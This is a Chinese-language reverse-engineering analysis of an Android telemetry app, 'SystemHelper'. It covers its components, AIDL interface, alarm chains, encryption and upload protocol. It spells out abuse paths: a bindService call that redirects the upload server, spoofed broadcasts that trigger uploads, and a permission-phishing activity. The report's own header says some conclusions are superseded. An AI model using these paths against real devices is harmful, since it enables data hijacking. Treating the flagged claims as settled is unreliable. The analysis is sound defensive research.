> **历史分析材料，含已纠正结论，不能作为最终结论引用。** 请先阅读 [最终复核报告](../REPORT.md)。原材料中的“MD5 派生密钥等于不加密”“全量已安装应用清单”“隐私告知永远不可达”“设为 1 秒即每秒上传”“无时间戳/已证实重放”等说法已被收窄或纠正；本次公开版未重新验证全部 OEM 分支。已删除本地身份路径，未包含真实用户采集值。

# SystemHelper 1.2 (com.mobiletools.systemhelper) — 应用外壳 / 工具层 / 资源 逆向分析

- 样本：`[LOCAL_PATH_REMOVED]`
- 版本：1.2-20230925-U，versionCode 3，minSdk 24，targetSdk 28，compileSdk 33
- 包名 `com.mobiletools.systemhelper`，`sharedUserId=com.mobiletools.systemhelper.uid`，`sharedUserMaxSdkVersion=32`
- `usesCleartextTraffic=true`，`allowBackup=false`，`extractNativeLibs=false`
- 源码基线：apktool 反编译目录 `analysis\SystemHelper\apktool\`（只读，未做任何修改）
- 分工说明：`e0/*`（85 个采集器）、`e0/r` 基类、`e0/c2` 配置调度、`d0/*`（上报线程）由他人分析，本文只在其调用边界处引用。

---

## 1. 组件清单与调用图（含 exported 风险）

### 1.1 清单（AndroidManifest.xml:16-48）

| 组件 | 类型 | exported | intent-filter / 权限 | 说明 |
|---|---|---|---|---|
| `com.mobiletools.systemhelper.Activity.TestActivity` | Activity | **true** | action `com.mobiletools.systemhelper.activity.testactivity` + category DEFAULT | 唯一 UI 页；权限引导 + 调试文本 |
| `com.mobiletools.systemhelper.control.DMApplication` | Application | — | — | 进程启动钩子 |
| `com.mobiletools.systemhelper.control.OnBootReceiver` | Receiver | **true** | `BOOT_COMPLETED`、`QUICKBOOT_POWERON`，**`android:priority="2147483647"`（int 最大值）** | 自启动 + 定时链路的“总开关” |
| `com.mobiletools.systemhelper.control.ScheduleRegisterReceiver` | Receiver | false（未显式声明） | 无 filter | 仅由自家 alarm 调起（周期上报） |
| `com.mobiletools.systemhelper.control.AppInfoRegisterReceiver` | Receiver | false | 无 filter | 仅由自家 alarm 调起（应用清单上报） |
| `com.mobiletools.systemhelper.control.SIMStateReceiver` | Receiver | **true** | `android.intent.action.SIM_STATE_CHANGED` | 双注册：清单静态 + 运行时动态各一份 |
| `com.mobiletools.systemhelper.control.ConnectStateReceiver` | Receiver | **true** | `android.net.conn.CONNECTIVITY_CHANGE` | 静态 + 动态双注册，仅打日志 |
| `com.mobiletools.systemhelper.service.RegisterHelperService` | Service | **true** | action `com.mobiletools.systemhelper.service.IRegisterHelperService`，**无 `android:permission`** | AIDL 跨进程“遥控口”，**最严重风险点** |
| `com.mobiletools.systemhelper.service.RegisterIntentService` | IntentService | false | — | 绑定 OEM 私有电话服务 + 触发上报 |
| `com.mobiletools.systemhelper.service.RegisterJobService` | JobService | false | `android:permission="android.permission.BIND_JOB_SERVICE"` | **全工程无 JobScheduler/JobInfo 调用 → 死组件** |

清单还声明了 `<permission android:name="com.mobiletools.systemhelper.permission" android:protectionLevel="signature"/>`，但**全工程没有任何组件使用该权限**（`android:permission` 属性未引用它），属于“声明了却没用于保护自己”的典型问题。

### 1.2 调用图（组件 → 工具层 → 上报）

```
BOOT_COMPLETED / QUICKBOOT_POWERON
   └─ OnBootReceiver.onReceive
        ├─ f0/l.c("preference_enable_log", false) → f0/f.a   （日志总开关）
        ├─ [SDK>=30] e0/r.k(ctx)                            （采集器初始化，他人在分析）
        └─ action∈{BOOT_COMPLETED, QUICKBOOT_POWERON}
             ├─ f0/a.b(ctx, 240000ms)  → PendingIntent→OnBootReceiver（4 分钟后自唤醒）
             ├─ f0/a.d(ctx, scheduleInterval=24h) → ScheduleRegisterReceiver
             └─ f0/a.a(ctx, appInfoInterval=7d)   → AppInfoRegisterReceiver

(4 分钟后) OnBootReceiver.onReceive(action=null)   ← else 分支
   ├─ new SIMStateReceiver().b(ctx)     → registerReceiver(SIM_STATE_CHANGED) 动态注册（f0/f.u=true 吞首事件）
   ├─ new ConnectStateReceiver().b(ctx) → registerReceiver(CONNECTIVITY_CHANGE) 动态注册（f0/f.v=true 吞首事件）
   ├─ [网络已连 && simState==5(READY) && SDK>=30 && f0/f.t>=0]
   │     ├─ f0/f.t--（初值 2）
   │     └─ 若 f0/f.n、f0/f.o 为空 → f0/a.b(ctx, 3000ms) 重新挂 3 秒后自唤醒；return
   ├─ e0/c2.i() + e0/c2.h(ctx) → 得到运营商/机型配置对象（z0/c0/e0 分支）
   ├─ firstPowerOn(prefs) 非空 ? RegType="B" : RegType="F"（并回写 firstPowerOn="firstPowerOn"）
   └─ 分支：
        OEM 分支（e0/z0 | e0/c0 | e0/e0）→ startService(RegisterIntentService{RegType=B|F})
        其它                        → d0/g.b(ctx, "B"|"F")（直接上报线程）

ScheduleRegisterReceiver（24h 一次）
   ├─ [SDK>=30] e0/r.k(ctx)
   ├─ f0/a.d(ctx, scheduleInterval)             ← 自我续期，永远 24h
   ├─ RegType="S" → RegisterIntentService 或 d0/g.b(ctx,"S")
   └─ [SDK>=31] e0/r.s(ctx)                     （权限二次申请，他人在分析）

AppInfoRegisterReceiver（7d 一次）
   ├─ f0/a.a(ctx, appInfoInterval)              ← 自我续期，永远 7d
   ├─ RegType="A" → RegisterIntentService 或 d0/g.b(ctx,"A")
   └─ [SDK>=31] e0/r.s(ctx)

SIMStateReceiver.onReceive（动态注册实例 + 清单静态实例）
   ├─ action==SIM_STATE_CHANGED:
   │    ├─ state==1(ABSENT) && SDK>=30 → e0/r.s(ctx)；清空 f0/f.n/f0/f.o
   │    ├─ [SDK>=30] e0/r.k(ctx)
   │    └─ f0/a.c(ctx, 360000ms) → 6 分钟后回到 SIMStateReceiver（action=null）
   └─ action!=SIM_STATE_CHANGED（含 alarm 的 null action）:
        └─ RegType="T" → RegisterIntentService 或 d0/g.b(ctx,"T")

ConnectStateReceiver.onReceive → 仅 f0/l.l(ctx) 判断连通并打日志，无采集动作

TestActivity.onCreate
   ├─ setContentView(R.layout.activity_test)
   ├─ f0/l.c("preference_enable_log", false) → f0/f.a
   ├─ [SDK>=30] e0/r.k(ctx)
   ├─ 检查 READ_PHONE_STATE / ACCESS_COARSE_LOCATION / ACCESS_NETWORK_STATE
   │    全有 → B()；缺任一 → android.support.v4.app.a.f(this, perms, 1) 申请
   └─ onRequestPermissionsResult(1, …)：三个全 granted → B()，否则 finish()
B()  ├─ findViewById(R.id.tv_device_info)
     ├─ OEM 分支（z0/c0/e0）→ startService(RegisterIntentService)（不带 RegType → d0/g.a(ctx)）
     └─ 其它 → tv.setText(d0/g.c(ctx))（本地缓存/设备信息字符串）
```

### 1.3 exported 风险点（逐条）

1. **`RegisterHelperService`（service/RegisterHelperService.smali:41-55，service/a$a.smali:41-146）**
   `android:exported="true"` 且**没有 permission 保护**，带 intent-filter（可隐式绑定）。任何第三方应用用
   `bindService(new Intent("com.mobiletools.systemhelper.service.IRegisterHelperService").setPackage("com.mobiletools.systemhelper"), conn, BIND_AUTO_CREATE)`
   即可拿到 Binder，调用 5 个方法（见 §1.4）。后果：改写上报服务器地址、改写上报周期、开关日志、**删除整个 prefs 文件**。
2. **`TestActivity`（Activity/TestActivity.smali）** exported + 自定义 action → 任何应用可随时拉起它；它会主动弹出 `READ_PHONE_STATE` / 定位 / `ACCESS_NETWORK_STATE` 三项敏感权限请求（targetSdk 28，弹窗样式为系统权限框），属于可被第三方“借壳”骗取授权的钓鱼面。授予后还会启动 `RegisterIntentService` 触发一次上报。
3. **`OnBootReceiver`** exported：`BOOT_COMPLETED` 是保护广播（普通应用不能伪造），但**显式组件调用不被拦截**——任意应用 `sendBroadcast(new Intent().setClassName("com.mobiletools.systemhelper","…OnBootReceiver"))`（action 为 null 或自定义）即会走 else 分支：注册两个动态广播接收者、初始化采集器配置、并立刻触发一次 RegType=B/F 的上报。可被用于放大流量/探测应用是否存在。
4. **`SIMStateReceiver`** exported：伪造 `SIM_STATE_CHANGED`（该 action 非保护广播，第三方可发）即可让它进入“等 SIM 就绪”分支，反复挂 6 分钟 alarm 并调用 `e0/r.s`（权限再申请）；发其它 action 则直接走 RegType="T" 上报。
5. **`ConnectStateReceiver`** exported：伪造 `CONNECTIVITY_CHANGE` 只触发日志，危害低（但可用于探测安装状态）。
6. **`RegisterJobService`** 虽带 `BIND_JOB_SERVICE`，但全工程无 `JobScheduler`/`JobInfo` 引用（已全局 grep 确认），本版本是死代码。

### 1.4 AIDL 能力面（service/a、service/a$a、RegisterHelperService$a）

接口描述符：`com.mobiletools.systemhelper.service.IRegisterHelperService`（a$a.smali:26）。
`onTransact` 事务码：1→`r(String)`，2→`i(int)`，3→`u()`，4→`s(boolean)`，5→`o()Z`（另外 `0x5F4E5446`=INTERFACE_TRANSACTION 返回描述符）。

| 方法 | 真实语义 | 落点（键/文件） | 被滥用后果 |
|---|---|---|---|
| `r(String)` | 设置上报服务器地址 | `f0/l.t(ctx,s)` → prefs `serverAddress` | **把全部遥测流量改指攻击者服务器**（配合明文 HTTP 可完整窃取/伪造上报） |
| `i(int)` | 用 1 个整数成比例设置三个周期 | `scheduleInterval = n`；`appInfoInterval = n*8/5`；`signalInfoInterval = n*9/5`（整数除法，RegisterHelperService$a.smali:34-76） | 把 24h 改成 1s → 高频上报，耗电/耗流量/打爆服务端 |
| `o()` | 读日志开关 | prefs `preference_enable_log` | 信息泄露探测（是否开启调试日志） |
| `s(boolean)` | 写日志开关 | `f0/f.a` + prefs `preference_enable_log` | 打开调试日志 → logcat 泄露设备信息/上报明文 |
| `u()` | 删除偏好文件 | `f0/l.a()`：`File.delete("/data/data/com.mobiletools.systemhelper/shared_prefs/com_mobiletools_systemhelper_preference.xml")` | DoS：清掉 firstPowerOn/周期/服务器地址，回到默认配置 |

注：`f0/l` 全部使用 `getSharedPreferences(name, 4)`，即 **MODE_MULTI_PROCESS**（已废弃），跨进程读写不保证一致性；`u()` 直接删除文件而不清内存缓存，属于不稳定实现。

---

## 2. 启动 / 保活链（含全部周期数值）

| 环节 | 触发 | 动作 | 周期/延迟（十六进制 → 十进制） |
|---|---|---|---|
| 开机 | `BOOT_COMPLETED`、`QUICKBOOT_POWERON`（priority=2147483647） | 读日志开关、`e0/r.k`、挂 3 个 alarm | `0x3A980` = **240000 ms = 4 分钟**（自唤醒） |
| 常规上报 | `ScheduleRegisterReceiver` | RegType=`S`、自我续期 | `0x5265C00` = **86400000 ms = 24 小时**（`f0/f.y`，可被 AIDL 改） |
| 应用清单上报 | `AppInfoRegisterReceiver` | RegType=`A`、自我续期 | `0x240C8400` = **604800000 ms = 7 天**（`f0/f.z`，可被 AIDL 改） |
| SIM 就绪等待 | `SIM_STATE_CHANGED` 后 | 挂 alarm 回 SIMStateReceiver | `0x57E40` = **360000 ms = 6 分钟** |
| SIM/网络类型未就绪重试 | OnBootReceiver else 分支 | 重新挂自唤醒 alarm | `0xBB8` = **3000 ms = 3 秒**，最多 3 次（`f0/f.t` 初值 2，判断 `>=0` 后自减 → 2,1,0） |
| 出口 IP 查询 | 上报前 | `f0/e.a()` GET `…/public/ip` | 连接/读取超时各 `0xBB8` = 3000 ms |
| 上报 POST | `f0/g.c()` | 见 §3.7 | 连接 `0x2710`=10000 ms，读取 `0x3A98`=15000 ms |
| 信号上报周期 | 仅 AIDL 可写 | prefs `signalInfoInterval` | 默认**无读取方**，出厂无默认值 |

要点：

- `f0/a.e()` 与 `f0/a.f()` 是**恒返回 true 的桩函数**，所以四条 alarm 全部走 `AlarmManager.setExactAndAllowWhileIdle(2, elapsedRealtime()+delay, pi)`：type 2 = `ELAPSED_REALTIME_WAKEUP`，精确且可在 Doze 下唤醒。`else` 分支的 `set()`/`setExact()` 代码在编译期被“常量 true”短路，属于不可达死分支（f0/a.smali:275-289）。
- PendingIntent flags 恒为 `0xC000000` = `FLAG_UPDATE_CURRENT | FLAG_IMMUTABLE`，requestCode 恒为 0 → 同一 receiver 的多个 alarm 会互相覆盖（同一 PendingIntent 只有一条）。
- **没有任何 setRepeating**：每条链靠接收者“处理时再挂下一次”，因此重启后会由 BOOT 重新播种，形成永续链条；`SCHEDULE_EXACT_ALARM` 已在清单声明（targetSdk 28 下默认授予）。
- 首次运行判定靠 prefs `firstPowerOn`：为空 → RegType=`F` 并在末尾写回 `"firstPowerOn"="firstPowerOn"`；非空 → RegType=`B`。
- `DMApplication.onCreate`（control/DMApplication.smali:17-37）在 **SDK≥30** 时直接调 `e0/r.k(ctx)`，即“任何进程启动都会初始化采集器”，不依赖 UI。
- `RegisterJobService` 未被任何代码调度，无 JobInfo 周期/约束可谈（死组件）。

---

## 3. f0 工具层逐类说明

### 3.1 `f0/l` — SharedPreferences 封装（19.6 KB，核心）

- 偏好文件名：**`com_mobiletools_systemhelper_preference`** → 落盘 `/data/data/com.mobiletools.systemhelper/shared_prefs/com_mobiletools_systemhelper_preference.xml`（该绝对路径硬编码在 `f0/l.a()`，f0/l.smali:39）。
- 打开模式恒为 `4`（`MODE_MULTI_PROCESS`）；写入用 `commit()`（同步落盘），读取用 `getXxx`。
- 方法语义：`c/q`=boolean 读/写，`e/r`=long 读/写，`h/v`=String 读/写，`b/f/g`=三个业务默认值读取，`p/s/t/u`=三个周期 + 服务器地址的便捷写，`d()`=时间戳 `yyyy-MM-dd HH:mm:ss`（`SimpleDateFormat`，Locale.getDefault），`i/j/k`=**反射 `android.os.SystemProperties.get`**（1 参 / 2 参 / 带 "unknown" 兜底），`l()`=`ConnectivityManager.getActiveNetworkInfo().isConnected()`，`o()`=Wi-Fi(`TYPE_WIFI=1`) 是否 CONNECTED，`m(d0/g)`=按 `DataSlot`+`NetworkOperator` 判定**联通卡（46001/46006/46009）**，`n(String)`=同上的纯字符串版。
- **完整键表**（全工程 grep 交叉验证，仅此 8 个键 + 4 个采集器缓存键）：

| 键 | 类型 | 默认值 | 读 / 写 API | 语义 |
|---|---|---|---|---|
| `appInfoInterval` | long | `0x240C8400`=604800000（7 天） | `b()` / `p()`、AIDL `i()`（=n*8/5） | 应用清单上报周期 |
| `scheduleInterval` | long | `0x5265C00`=86400000（24 小时） | `f()` / `s()`、AIDL `i()`（=n） | 常规上报周期 |
| `signalInfoInterval` | long | 无默认读取（仅写） | — / `u()`、AIDL `i()`（=n*9/5） | 信号上报周期（本版本无消费方） |
| `serverAddress` | String | `http://dm.wo.com.cn:18080/registerv3` | `g()` / `t()`、AIDL `r()` | 上报 URL（**明文 HTTP**） |
| `preference_enable_log` | boolean | `false` | `c()` / `q()`、AIDL `s()` | 日志总开关 → `f0/f.a` |
| `firstPowerOn` | String | `""` | `h()` / `v()` | 首启标记；非空即改用 RegType=`B` |
| `CellID0`、`CellID1`、`LAC0`、`LAC1` | String | `""` | `h()`（`e0/r` 读取，共 14 处） | 小区缓存（采集器侧写入） |
| `iccid1`、`iccid2` | String | `""` | `h()` / `v()`（各 2 处写入） | 两张卡 ICCID 缓存 |

> 结论：**没有** deviceId/IMEI/上传时间/URL 列表类键——设备标识与业务数据不落 prefs，全部走内存 bean（`d0/g`）与 SQLite 缓冲。因此“遥测开关”只有一个（`preference_enable_log` 是**日志**开关，不是采集开关；采集总开关是内存静态量 `f0/f.g`，默认 `true`）。

### 3.2 `f0/d` — SQLiteOpenHelper（库 `systemhelper`，表 `history`）

- 库名 `systemhelper`，版本 `1`（`f0/d.b`），表名 `history`（`f0/d.d`）。
- 建表：`create table history(id integer primary key autoincrement, jsonString text)`（f0/d.smali:496）；`onUpgrade` 空实现（无迁移）。
- 单例：`b(Context,String,int)` 加锁 + `AtomicInteger` 计数；`close()` 计数归零才置空单例。
- 写入 `c(String json)`（f0/d.smali:140-235）：先 `query` 全表取 `count`，**若 `count >= 100（0x64）`** 则 `moveToFirst()` 取最早一行的 `jsonString` 值，用 `delete where jsonString=?` **按值删除那条**（不是按 id！若两条 json 完全相同会一次删掉多条），再 `insert`。→ 容量上限 **100 条**，FIFO 语义但实现有偏差。
- 读取：`d()` 普通 query → `JSONArray`；`e()` 同逻辑但用 `CursorWindow("queryWindow", 0x1400000=20 MB)` 提升大结果承载（d0/k 依据条数阈值切换，`d0/k.smali:~120`）。
- 清理：`a()` = `delete from history`（无 where），全清。
- 调用方（`d0/k` = 上报线程）：成功 → `a()` 清空（`d0/k.smali:327`）；失败 → 先把 `d0/g.M`（历史数组字段）置 null 避免重复携带，再 `c(json)` 落库重试（`d0/k.smali:356/528/560/631`）。→ **history 是断网/失败重试队列**。

### 3.3 `f0/m` — SQLiteOpenHelper（库 `signalhelper`，表 `signal`）

- 库名 `signalhelper`，版本 1，表名 `signal`；建表 `create table signal(id integer primary key autoincrement, jsonString text)`（f0/m.smali:272），`onCreate` 里多打一条 `SignalDatabaseHelper onCreate-->` 日志（**注意 TAG 与类名不一致**）。
- 只提供 `a(ctx,String,int)`（单例）与 `b()`（全表 → `JSONArray`，20 MB CursorWindow）。**没有 insert 方法，全工程也没有任何代码往 signal 表写数据**（`Lf0/m;->` 的调用点只有 `d0/f`、`d0/j` 取实例与 `b()`）。
- 现状：`d0/j`（SDK≥28）把 `b()` 的结果 `String.valueOf()` 塞进 `d0/g.N`；表为空时返回 `null` → `"null"` 字符串进上报体。**属于“预留但未启用”的信号历史表**。

### 3.4 `f0/a` — Alarm 静态封装

- `a(ctx,delay)`→`AppInfoRegisterReceiver`；`b(ctx,delay)`→`OnBootReceiver`；`c(ctx,delay)`→`SIMStateReceiver`；`d(ctx,delay)`→`ScheduleRegisterReceiver`。
- 四个方法体完全同构：`PendingIntent.getBroadcast(ctx, 0, new Intent(ctx, X.class), 0xC000000)` + `AlarmManager.setExactAndAllowWhileIdle(2, elapsedRealtime()+delay, pi)`（`e()`/`f()` 恒 true，见 §2）。
- 注意：`f0/a.b()` 既用于“开机后 4 分钟自唤醒”又用于“SIM 未就绪 3 秒重试”，两者共用同一 PendingIntent（requestCode 0 + 同组件），**会互相覆盖**。

### 3.5 `f0/b` — 应用信息 JSON bean

字段（构造时 `g=-1`，其余 0）：`a`=pkgName、`b`=appLabel、`c`=runTime(min)、`d`=totalData1、`e`=totalData2、`f`=totalDataWiFi、`g`=序号(int)、`h`=tx1、`i`=rx1、`j`=tx2、`k`=rx2、`l`/`m`=未序列化的两个 long。
`a()` → `JSONObject`：`appLabel`、`pkgName`、`runTime`=`"<n>min"`、`tx1/rx1/tx2/rx2`=`"<n>KB"`、`totalData1`/`totalData2`=`"<n>KB"`、`totalDataWiFi`=`"<n>MB"`（单位混用 KB/MB，字符串拼接）。`b()` → `g`。
setter 映射（易错点）：`c()`→`b`(appLabel)、`d()`→`a`(pkg)、`e()`→`c`(runTime)、`f()`→`i`(rx1)、`g()`→`k`(rx2)、`h()`→`m`、`i()`→`d`(totalData1)、`j()`→`e`(totalData2)、`k()`→`f`(wifi)、`l()`→`h`(tx1)、`m()`→`j`(tx2)、`n()`→`l`、`o()`→`g`(序号)。

### 3.6 `f0/c` / `f0/k` — 加解密

- `f0/c.a(String,[B)`：`AES/ECB/PKCS5Padding` 加密（key = 传入字节，key 长度即 16/24/32），明文 `getBytes("utf-8")`；异常全部 `printStackTrace` 后返回 `null`（静默失败）。
- `f0/c.b([B)`：`Base64.encodeToString(b, 0, len, 0)`（flags=0 即 `Base64.DEFAULT`，按 Android 语义每 76 字符插入换行，末尾带 `\n`；调用方随后又做 `URLEncoder`，因此 `sign` 里会出现 `%0A` 折行，说明实现较为粗糙）。
- `f0/c.c(Context,[B)`：读 `assets/pub.cer` → `f0/k.b(InputStream)` 取公钥 → `f0/k.a(Key,[B)` 做 `RSA/ECB/PKCS1Padding` 加密。
- `f0/c.d(String)`：MD5（`MessageDigest("MD5")`，UTF-8）。
- `f0/k`：`b()` 用 `CertificateFactory.getInstance("X.509").generateCertificate()` 取 `getPublicKey()`；`a()` 用 `RSA/ECB/PKCS1Padding`，私钥/公钥皆可（`Cipher.ENCRYPT_MODE`，只传入公钥使用）。类内还留了 16 元素十六进制字符表 `a[16]`（`"0123456789abcdef"`），**未被使用（残留代码）**。
- 缺陷提示：**签名/加密用的密钥都由明文自身派生**（见 §3.7），`AES` 密钥 = `MD5(明文)`，等价于没有机密性；`RSA` 只用于包裹这个 MD5，作用是“让持有私钥的运营方校验”，不是给客户端保密。

### 3.7 `f0/g` — HTTPS/HTTP POST 封装与上报契约

方法 `c(String url, byte[] body, byte[] unused)Z`（第 3 个参数被局部变量覆盖后**完全未使用**）：

- `POST`，`connectTimeout=10000`，`readTimeout=15000`，`doOutput=doInput=true`；
- 请求头：`Content-Type: application/encrypted-json`，`Content-Length: <body 长度>`；
- 响应：`respCode==200` → 打 `Log.d("HttpEncryptHelper","register success!")` 并返回 `true`；否则 `f0/j.b("HttpEncryptHelper","register fail!")` 返回 `false`；`b()` 返回最近一次状态码；`a()`=disconnect。
- 调用方 `d0/k` 额外把 **HTTP 416（`0x1A0`）当作成功**（视为“已注册”）。

**完整请求契约**（唯一调用点 `d0/k.smali:150-270`）：

```
plaintext = d0/g.d()                              # 设备/卡/应用清单的 JSON 字符串
md5       = MD5(plaintext)                        # 16 字节，f0/c.d
sign      = URLEncode( Base64( RSA_PKCS1_pub.cer(md5) ) )     # f0/c.c + f0/c.b
body      = AES/ECB/PKCS5( plaintext, key = md5 )            # f0/c.a
url       = <prefs.serverAddress> + "?ver=3.0&model=" + URLEncode(Build.MODEL)
                                 + "&manuf=" + URLEncode(Build.MANUFACTURER)
                                 + "&sign="  + sign
POST url, body   → 200（或 416）视为成功
```

`serverAddress` 默认 `http://dm.wo.com.cn:18080/registerv3`（`ver=3.0` 硬编码在 `d0/k`）。默认地址归属 **中国联通（wo.com.cn）**，`dm` = device management，`:18080` 为非标准明文端口。

### 3.8 `f0/e` — 出口 IP 查询

`a()`：`GET http://dm.wo.com.cn:18080/public/ip`（`f0/f.x`），连接/读取各 3000 ms，`useCaches=false`，识别 `Content-Encoding: gzip` 并解压，逐行读、`trim()` 后返回；非 200 时把 `getResponseMessage()` 记日志并返回 `null`。唯一调用方 `d0/h.b()`：仅当“网络已连”才查，结果作为上报体的 **IPv4 外网地址**（`d0/h.e`），本地地址另由 `a()` 填充。

### 3.9 `f0/h` — MD5 十六进制

`a(String)`：MD5 → 逐字节 `Integer.toHexString` 补零 → `toLowerCase()`；入参为 `null`/空串直接返回 `""`。异常分支里 `MessageDigest` 可能为 null 后继续 `digest()` → 潜在 NPE（`f0/h.smali:80`）。

### 3.10 `f0/i` — MemoryUtils（内存/存储容量）

- `a()`：`StatFs(Environment.getDataDirectory())` 的 `freeBlocks*blockSize / 1024^3` 取整 → `"<n>G"`（FREE）。
- `b()`：读 `/proc/meminfo_memsize`（部分国产 ROM 才有）解析 `memsize`，去 `kB`、转 GB、`ceil` → `"<n>G"`。
- `d()`：兜底读 `/proc/meminfo` 首行 `MemTotal:`，去 `kB`、转 GB、`ceil`。
- `e()`：`blockCount*blockSize/1024^3`，向上取到 **2 的幂**（`2^n`）→ `"<n>G"`（ROM）。
- `c()`：`{"RAM":…,"ROM":…,"FREE":…}`，空值填 `"Unknown"`。
- `f(String path)`：通用 `key: value` 文本 → `HashMap`（`Scanner`，`split(":")` 必须恰 2 段）。

### 3.11 `f0/j` — 日志

- 两个静态开关**串联**：`f0/j.b`（恒 `true`，无人改）+ `f0/f.a`（= prefs `preference_enable_log`，默认 `false`）。
- `a(TAG,msg)` → `Log.d`，单条 > `0xC00`=3072 字符自动分片；`b(TAG,msg)` → `Log.e`（不分片）；`c(Context,String)` **空方法体**（`f0/j.smali:120-124`）。
- **不落盘、不上报、无文件日志**；出厂默认关闭。TAG 使用字符串字面量（`RegisterUtils`、`HttpEncryptHelper`、`RSAHelper`、`MemoryUtils`、`SignalDatabaseHelper`、`AppInfo`、`RegisterThread`、`RegisterIntentService`、`RegisterHelperService`、`RegisterJobService`、`SIMStateReceiver`、`ConnectStateReceiver`、`ScheduleRegisterReceiver`、`AppInfoRegisterReceiver`、`OnBootReceiver`、`DMApplication`），另有一处写死 `Log.e("TAG","Entering the onbootreceiver")`（OnBootReceiver.smali:30-34）——**无视开关，永远输出**。
- 注意 `f0/j` 的分片循环用 `substring(start, end)` 且 `start` 用的是 `i*size` 变量被覆盖后的值，长消息切片存在 off-by-one 风险（`f0/j.smali:52-70`）。

### 3.12 `f0/n` — 三字符串 POJO

字段 `a/b/c`，getter `a()/c()/b()`（注意 `b()` 返回 `c` 字段、`c()` 返回 `b` 字段），setter `d()/f()/e()`。唯一使用方 `d0/f`（网络类型/槽位载体）。

### 3.13 `f0/o` — 反射工具

`a(String)`→`Class.forName`；`b(Class,String,Class[])`→`getDeclaredMethod`；`c(Method,Object,Object[])`→`setAccessible(true)` + `invoke`；异常一律 `printStackTrace` 返回 `null`。被 `e0/*` 大量使用（`q0`/`x1`/`n0` 等各上百处）——**这是绕过隐藏 API 限制去读系统私有字段的主要手段**。

---

## 4. 常量表

### 4.1 结论先行：`u/a … u/j` **不是**协议常量容器，而是 AppCompat 的 `R` 类

`method_index.txt` 里它们没有方法，因为都是 `public final` 的 `int`/`int[]` 常量表；`.field` 全量导出后与 `res/values/public.xml` 逐一对照，类型完全吻合（`u/j` 的 231 个字段是 `R$styleable` 的下标 + 24 个属性数组）。**真正的配置/协议常量在 `f0/f`（可写静态字段）与 `d0/g`/`e0/c2`（他人在分析）中。**

| 类 | 真实身份 | 字段数 | 值域 | 说明 |
|---|---|---|---|---|
| `u/a` | `R$attr` | 38 | `0x7f02xxxx` | `actionBarSize`(0x7f020003)、`colorAccent`(0x7f020058)、`toolbarStyle`(0x7f0201a5) … |
| `u/b` | `R$bool` | 1 | `0x7f030000` | `abc_action_bar_embed_tabs` |
| `u/c` | `R$color` | 7 | `0x7f04xxxx` | `abc_tint_*`、`abc_input_method_navigation_guard` |
| `u/d` | `R$dimen` | 12 | `0x7f05xxxx` | `abc_action_bar_stacked_max_height`、`tooltip_y_offset_*` … |
| `u/e` | `R$drawable` | 45 | `0x7f06xxxx` | 全部 `abc_*`（AppCompat 素材） |
| `u/f` | `R$id` | 42 | `0x7f07xxxx` | `action_bar`(0x7f07000b)、`title`(0x7f0700c6)、`topPanel`(0x7f0700cb) … |
| `u/g` | `R$layout` | 20 | `0x7f09xxxx` | 全部 `abc_*`/`support_simple_spinner_dropdown_item`（**不含** `activity_test`） |
| `u/h` | `R$string` | 12 | `0x7f0bxxxx` | `abc_menu_*_shortcut_label`、`abc_prepend_shortcut_label` … |
| `u/i` | `R$style` | 3 | `0x7f0cxxxx` | `Animation.AppCompat.Tooltip`、`Theme.AppCompat.CompactMenu`、`Theme.AppCompat.Light` |
| `u/j` | `R$styleable` | 231 | 整数下标 + 24 个 `int[]` | `a[]`、`O[]`、`P[]`、`Q[]`、`R[]`、`V[]`、`E[]`、`F[]`、`a0[]`、`r0[]`、`O0[]` 等属性集 |

### 4.2 `f0/f` — 应用级配置/运行时状态常量（`f0/f.smali`，全部**非 final**、可被任意类改写）

| 字段 | 类型 | 初值 | 语义 | 被谁写 |
|---|---|---|---|---|
| `w` | String | `http://dm.wo.com.cn:18080/registerv3` | 默认上报地址 | 无（走 prefs 覆盖） |
| `x` | String | `http://dm.wo.com.cn:18080/public/ip` | 出口 IP 查询 | 无 |
| `y` | long | `0x5265C00`=86400000 | 默认 scheduleInterval（24h） | 无 |
| `z` | long | `0x240C8400`=604800000 | 默认 appInfoInterval（7d） | 无 |
| `t` | int | `2` | SIM/网络就绪等待重试计数 | OnBootReceiver（自减） |
| `g` | boolean | `true` | 采集总开关 | `e0/*` 30+ 处 |
| `a` | boolean | `false` | 日志开关 | TestActivity / OnBootReceiver / AIDL `s()` |
| `b`~`e` | boolean | `false` | 未使用的标志位 | 无 |
| `f` | Context | `null` | 未使用的静态 Context | 无 |
| `h`/`i` | TelephonyManager | `null` | 卡槽 TelephonyManager 缓存 | `e0/*`/`d0/*` |
| `j`/`k` | `d0/e` | `null` | 卡槽信息 bean | 他人范围 |
| `l`/`m` | `d0/f` | `null` | 信号 bean | 他人范围 |
| `n`~`s` | String | `""` | `NetworkTypeSlot1/2`、`DataSlot` 等字符串缓存 | `e0/*` |
| `u`/`v` | boolean | `false` | SIMState/ConnectState 动态注册“吞首事件”标志 | 两个 Receiver |
| `A` | `b0/a` | `null` | 努比亚 `INBExtTelephony` 代理 | `RegisterIntentService$a` |
| `B` | `c0/a` | `null` | 格力 `IGreeTelephonyManager` 代理 | `RegisterIntentService$b` |

### 4.3 散落数值/协议常量

| 常量 | 值 | 出处 |
|---|---|---|
| 开机自唤醒延迟 | `0x3A980` = 240000 ms（4 min） | OnBootReceiver.smali:112 |
| SIM 就绪等待 | `0x57E40` = 360000 ms（6 min） | SIMStateReceiver.smali:211 |
| 网络/槽位重试 | `0xBB8` = 3000 ms | OnBootReceiver.smali:280 |
| 上报 POST 连接/读取超时 | `0x2710`=10000 / `0x3A98`=15000 | f0/g.smali:86/92 |
| IP 查询超时 | `0xBB8`=3000 / `0xBB8`=3000 | f0/e.smali:47/53 |
| 日志分片长度 | `0xC00` = 3072 | f0/j.smali:7 |
| history 表上限 | `0x64` = 100 | f0/d.smali:178 |
| CursorWindow 大小 | `0x1400000` = 20 MB | f0/d.smali:411、f0/m.smali:146 |
| 上报版本号 | `"ver=3.0"` | d0/k.smali |
| Content-Type | `"application/encrypted-json"` | f0/g.smali:116 |
| 已注册成功码 | `0x1A0` = 416 | d0/k.smali |
| 联通 MCC/MNC | `46001`/`46006`/`46009` | f0/l.smali:422-426、589-613 |
| 线程池大小 | 2（`Executors.newFixedThreadPool(2)`） | a/b.smali:37 |
| 跨进程模式 | `4`（MODE_MULTI_PROCESS） | f0/l 全文件 |

---

## 5. 资源 / 资产分析

### 5.1 `assets/pub.cer`（596 字节，DER/X.509）

```
Length        : 596 bytes
Header        : 30 82 02 50 30 82 01 B9 …（SEQUENCE，len 0x250）
